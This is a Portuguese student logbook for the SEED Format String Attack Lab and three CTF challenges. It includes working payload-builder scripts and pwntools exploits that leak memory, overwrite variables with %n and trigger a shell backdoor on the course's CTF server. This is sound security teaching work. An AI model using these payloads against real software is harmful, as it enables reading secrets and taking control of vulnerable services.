# SEED Labs - Format String Attack Lab

## Tarefa 1: *Crashar* o Programa

* Em primeiro lugar, iniciamos os *containers* (usando o ficheiro `docker-compose.yml`) com os comandos `dcbuild` e `dcup`

* Para testar a ligação ao servidor no endereço 10.9.0.5, experimentamos correr `echo hello | nc 10.9.0.5 9090` e verificamos que o texto "hello" foi impresso na consola que corria o *container* em que se alojava o servidor

* Para *crashar* o programa, bastou correr o *script* `build_string.py` e fazer `cat badfile | nc 10.9.0.5 9090`

* Isto funcionou porque - ao correr `build_script.py` - foi criado um ficheiro `badfile` cujo conteúdo é uma *string* que, a partir da posição de índice 8, continha 12 `%.8x` seguidos de `%n` (isto é, a *substring* `%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%n`) e - ao fazer `cat badfile | nc 10.9.0.5 9090` - o conteúdo desse ficheiro foi enviado para o servidor

* Ora, como o texto enviado para o servidor é diretamente atribuído à *string* de formatação da chamada à função `printf` (`printf(msg)`, de acordo com o código do ficheiro `format.c`), foi aproveitada essa *format string vulnerability* para retirar (e imprimir) 12 elementos da *stack*, sendo que um deles terá sido o endereço de retorno do programa (ou de uma função por ele chamada, como é o caso de `myprintf`), o que terá causado com que este *crashasse*

* A captura de ecrã abaixo comprova que o programa *crashou* (não imprimiu "Returned properly")

![Tarefa 1](/images/logbook7-tarefa1.png)

## Tarefa 2: Imprimir a Memória do Programa do Servidor

### Tarefa 2.A: Dados da *Stack*

* Para imprimir dados da *stack*, são necessários 64 `%x`

* Chegamos a esta conclusão ao editar o ficheiro `build_script.py`, resultando no código abaixo

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x1234567a
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
# content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%x" * 64

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

* Este código coloca no início do ficheiro `badfile` o número **0x1234567a**, seguido de 64 `%x` - o valor 64 foi obtido experimentalmente através de ajustes/aproximações manuais

* Ao correr `./build_script.py` e fazer `cat badfile | nc 10.9.0.5 9090`, obtivemos o seguinte resultado do lado do servidor

![Tarefa 2.A](/images/logbook7-tarefa2a.png)

* Ora, o conteúdo impresso termina com o número **0x1234567a** (que tinha sido anteriormente introduzido por nós na *stack*, no início da variável `buf`), o que comprova que foram lidos dados da *stack* através do recurso a 64 especificadores `%x` (63 para retirar/imprimir valores entre a *string* de formatação e o início da variável `buf` e 1 para imprimir o início da variável `buf`)

### Tarefa 2.B: Dados da *Heap*

* De acordo com a informação impressa pelo servidor, o endereço da mensagem secreta armazenada na *heap* é **0x080b4008**

* Ora, para imprimir o conteúdo armazenado num endereço de memória, basta colocar esse endereço de memória na *stack* e usar um especificador `%s` para tentar ler a *string* que se encontra nesse mesmo endereço

* Como tal, em concordância com o valor determinado na tarefa anterior, editamos o ficheiro `build_string.py` para escrever, de forma *little-endian*, o número **0x080b4008** - correspondente ao endereço da mensagem secreta a ler - no início do ficheiro `badfile`, seguindo-o de 63 especificadores `%x` e 1 especificador `%s`, resultando no código seguinte

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to construct a string s with
#   63 of "%x", concatenated with a "%s"
s = "%x" * 63 + "%s"

# The line shows how to store the string s at offset 4
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

* Deste modo, ao correr `./build_script.py` e fazer `cat badfile | nc 10.9.0.5 9090`, foram impressos 63 valores (em hexadecimal) contidos na *stack*, seguidos da mensagem secreta **"A secret message"**, conforme comprova a captura de ecrã presente abaixo

![Tarefa 2.B](/images/logbook7-tarefa2b.png)

* Esta abordagem resultou porque o especificador `%s`, escrito diretamente na *string* de formatação, fez com que a chamada à função `printf` imprimisse o valor armazenado no endereço de memória presente na posição da *stack* correspondente ao especificador `%s`, isto é, na 64ª posição, que, conforme determinado anteriormente, é o início do conteúdo da variável `buf` (que, neste caso, continha o número/endereço **0x080b4008**)

## Tarefa 3: Modificar a Memória do Programa do Servidor

### Tarefa 3.A: Mudar o valor para um valor diferente

* De acordo com a informação impressa pelo servidor, o endereço da variável a alterar é **0x080e5068**

* Ora, para alterar o conteúdo armazenado num endereço de memória, basta colocar esse endereço de memória na *stack* e usar um especificador `%n` para escrever o número de caracteres impressos até ao momento nesse mesmo endereço

* Então, de forma semelhante ao processo anterior, editamos o ficheiro `build_string.py` para escrever, de forma *little-endian*, o número **0x080e5068** - correspondente ao endereço da variável a alterar - no início do ficheiro `badfile`, seguindo-o de 63 especificadores `%x` e 1 especificador `%n`, resultando no código seguinte

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to construct a string s with
#   63 of "%x", concatenated with a "%n"
s = "%x" * 63 + "%n"

# The line shows how to store the string s at offset 4
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

* Assim, ao correr `./build_script.py` e fazer `cat badfile | nc 10.9.0.5 9090`, verificamos que o valor da variável foi alterado de **0x11223344** para **0x000000ec**, tal como comprova a captura de ecrã abaixo

![Tarefa 3.A](/images/logbook7-tarefa3a.png)

* Este método funcionou porque o especificador `%n`, escrito diretamente na *string* de formatação, fez com que a chamada à função `printf` escrevesse o número de caracteres impressos até ao momento no endereço de memória presente na posição da *stack* correspondente ao especificador `%n`, isto é, na 64ª posição, que, conforme determinado anteriormente, é o início do conteúdo da variável `buf` (que, neste caso, continha o número/endereço **0x080e5068**)

### Tarefa 3.B: Mudar o valor para 0x5000

* Nesta tarefa, pretende-se alterar o conteúdo da variável armazenada no endereço **0x080e5068** para **0x5000**

* Ora, tal como explicado anteriormente, o especificador `%n` escreve o número de caracteres impressos até ao momento num endereço de memória, pelo que basta colocar o endereço de memória em questão na posição da *stack* correspondente ao especificador `%n` e, na *string* de formatação, imprimir o número pretendido de caracteres antes de alcançar o `%n`

* Como o número **0x5000** em hexadecimal corresponde a **20480** em decimal, é necessário imprimir 20480 caracteres antes do especificador `%n`

* Tendo em conta que a *string* de formatação tem de conter 63 `%x` (para, conforme determinado inicialmente, retirar os elementos necessários da *stack* até chegar ao início da variável `buf`), é possível alterar o especificador `%x` para `%.325x`, obrigando a que cada valor hexadecimal impresso seja constituído por 325 caracteres, totalizando, assim, 20475 (63 * 325 = 20475) caracteres impressos

* São também impressos os primeiros 4 caracteres da *string* de formatação (correspondentes ao número do endereço de memória no qual se irá escrever), pelo que fica a faltar apenas 1 caracter para totalizar os 20480

* Então, basta acrescentar, por exemplo, um caracter "1" antes dos especificadores `%.325x`, tal como é feito no *script* seguinte

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to construct a string s with
#   63 of "%.325x", concatenated with a "%n"
s = "1" + "%.325x" * 63 + "%n"

# The line shows how to store the string s at offset 4
fmt  = (s).encode('latin-1')
content[4:] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

* De facto, ao correr `./build_script.py` e fazer `cat badfile | nc 10.9.0.5 9090`, verificamos que o valor da variável foi alterado de **0x11223344** para **0x5000** conforme pretendido, tal como comprova a imagem abaixo

![Tarefa 3.B](/images/logbook7-tarefa3b.png)

* Este processo foi ao encontro do objetivo porque, antes de alcançar o `%n` presente na *string* de formatação, foram impressos 20480 caracteres (o que corresponde a 0x5000, em hexadecimal) e, na posição da *stack* correspondente à posição do especificador `%n` na *string* de formatação, estava o endereço de memória da variável a alterar, isto é, o valor **0x080e5068** estava colocado na 64ª posição da *stack*


# CTF 7 

## Desafio 1

* Ao corrermos ```checksec program```, descobrimos várias informações:

```
❯ checksec program
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000)
```
* o programa está compilado para uma arquitetura de 32 bits e é *little endian*
* o programa tem proteção de *RELRO*
* a *stack* tem um canário
* a *stack* não tem permissões de execução
* as posições do binário em memória não são aleatorizadas

* Com estas proteções, concluímos que não é possível realizar um ataque de *buffer overflow* (porque a *stack* tem canário e não tem permissões de execução), mas é possível realizar um ataque do tipo *format string*, porque as posições do binário em memória não são aleatorizadas, o que permite usar o *gdb* para analisar o programa e chegar aos endereços que precisamos

* Ao analisarmos o código-fonte do ficheiro `main.c` disponibilizado, verificamos que era pedido um *input* ao utilizador e que este era impresso pela função `printf` sem ser sanitizado, o que é uma vulnerabilidade de *format string*

```c	
scanf("%32s", &buffer);
printf("You gave me this: ");
printf(buffer);
```

* Observamos também que a *flag* fica guardada como variável global do programa, o que significa que podemos aceder ao seu conteúdo se conseguirmos encontrar o seu endereço de memória e ler o que está presente nesse endereço

```c
char flag[FLAG_BUFFER_SIZE];
```

* A vulnerabilidade encontrada permite escrever diretamente na *string* de formatação e, assim, ler o conteúdo apontado por um endereço de memória presente na *stack*

* As funcionalidades que nos permitem obter a *flag* são o especificador `%s`, que permite ler uma *string* de memória e imprimi-la, bem como o *gdb*, que nos permite obter esse endereço de memória

```
gdb program
p &flag
```

![Endereço](/images/logbook7-endereco-desafio1.png)

* Modificamos o ficheiro `exploit_example.py` para escrever o endereço da *flag* em *string* e em *little endian*, contendo o especificador `%s` no final da *string* de formatação, de maneira a ler do endereço pretendido

```python
#!/usr/bin/python3

from pwn import *

p = remote("ctf-fsi.fe.up.pt", 4004)

p.recvuntil(b"got:")
p.sendline(b"\x60\xC0\x04\x08%s")
p.interactive()
```

* Assim, obtivemos a *flag* `flag{803fe3f7ffea58b470eaaea84fd763c7}`

![Flag](/images/logbook7-flag-desafio1.png)

## Desafio 2

* Ao corrermos ```checksec program```, descobrimos várias informações:

```
❯ checksec program
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000)
```
* o programa está compilado para uma arquitetura de 32 bits e é *little endian*
* o programa tem proteção de *RELRO*
* a *stack* tem um canário
* a *stack* não tem permissões de execução
* as posições do binário em memória não são aleatorizadas

* Tendo em conta que as proteções são as mesmas que as do ficheiro `program` anterior, concluímos que também podemos realizar um ataque do tipo *format string*

* O código do ficheiro `main.c` é semelhante ao anterior, pelo que a vulnerabilidade se encontra na linha abaixo, devido à não sanitização do *input* do utilizador

```c
printf("There is nothing to see here...");
fflush(stdout);
scanf("%32s", &buffer);
```

* A vulnerabilidade identificada permite escrever diretamente na *string* de formatação e, assim, escrever num endereço de memória presente na *stack*

* Observamos também que `key` é uma variável global do programa e que, se esta tiver o valor `0xbeef`, é aberta uma *shell*, que nos permite ler o ficheiro `flag.txt` e, assim, aceder à *flag*

```c
if (key == 0xbeef) {
    printf("Backdoor activated\n");
    fflush(stdout);
    system("/bin/bash");    
}
```

* As funcionalidades que nos permitem obter a *flag* são o especificador `%n`, que permite escrever num endereço de memória, bem como o *gdb*, que nos permite obter esse endereço de memória

```
gdb program
p &key
```

![Endereço](/images/logbook7-endereco-desafio2.png)

* Como o número `0xbeef` em hexadecimal corresponde a **48879** em decimal, é necessário imprimir 48879 caracteres antes do especificador `%n`

* Tendo em conta que a *string* de formatação contém o endereço de memória no qual se irá escrever e este ocupa 4 caraceteres, fica a faltar imprimir 48875 (48879 - 4) caracteres para totalizar os 48879

* Então, basta acrescentar o especificador `%.48875x`, obrigando a que seja impresso um valor hexadecimal (do topo da *stack*) constituído por 48875 caracteres

* Finalmente, utilizamos `%1$n` para obrigar o especificador `%n` a escrever no endereço de memória pretendido, que se encontra no topo da *stack*

* Modificamos o ficheiro `exploit_example.py` para escrever o endereço pretendido em *string* e em *little endian*, seguido de `%.48875x` e de `%1$n`, de maneira a cumprir o pretendido

```python
#!/usr/bin/python3

from pwn import *

p = remote("ctf-fsi.fe.up.pt", 4005)

p.recvuntil(b"here...")
p.sendline(b"\x24\xB3\x04\x08%.48875x%1$n")
p.interactive()
```	

* Assim, obtivemos a *flag* `flag{8f9a9de482b266abe85cccb83783590d}`

![Flag](/images/logbook7-flag-desafio2.png)

## Desafio 2 (Extra Dificuldade)

* Este desafio é bastante similar ao anterior

* Ao correr `checksec program`, verificamos que o executável tem as mesmas permissões que anteriormente, o que nos permite efetuar um ataque do tipo *format string*

* Contudo, foi feita uma alteração ao código-fonte do ficheiro `main.c`, que se reflete num novo endereço de memória para a variável `key`: `0x0804b320`

![Endereço](/images/logbook7-endereco-desafio3.png)

* Tal como no desafio anterior, observamos que, se `key` tiver o valor `0xbeef`, é aberta uma *shell*, que nos permite ler o ficheiro `flag.txt` e, assim, aceder à *flag*

* O problema deste desafio reside no byte `0x20` do endereço de memória da variável `key`, que, de acordo com a Tabela ASCII, é interpretado como um caracter de espaço e, por isso, dificulta a escrita no endereço pretendido

* A solução encontrada foi escrever no endereço de memória imediatamente anterior (`0x0804b31f`) o valor `0xbeef00`, de maneira a escrever `0xbeef` por cima do endereço correto da variável `key`

* Como o número `0xbeef00` em hexadecimal corresponde a **12513024** em decimal, é necessário imprimir 12513024 caracteres antes de um especificador `%n`

* Tendo em conta que a *string* de formatação contém o endereço de memória no qual se irá escrever e este ocupa 4 caraceteres, fica a faltar imprimir 12513020 (12513024 - 4) caracteres para totalizar os 12513024

* Então, basta acrescentar o especificador `%.12513020x`, obrigando a que seja impresso um valor hexadecimal (do topo da *stack*) constituído por 12513020 caracteres

* Finalmente, utilizamos `%1$n` para obrigar o especificador `%n` a escrever no endereço de memória pretendido, que se encontra no topo da *stack*

* Modificamos o ficheiro `exploit_example.py` para escrever o endereço pretendido em *string* e em *little endian*, seguido de `%.12513020x` e de `%1$n`, de maneira a cumprir o pretendido

```python
#!/usr/bin/python3

from pwn import *

p = remote("ctf-fsi.fe.up.pt", 4008)

p.recvuntil(b"here...")
p.sendline(b"\x1f\xB3\x04\x08%.12513020x%1$n")
p.interactive()
```

* Assim, obtivemos a *flag* `flag{f0c4274bb3b9c1189ac989ab54342094}`

![Flag](/images/logbook7-flag-desafio3.png)
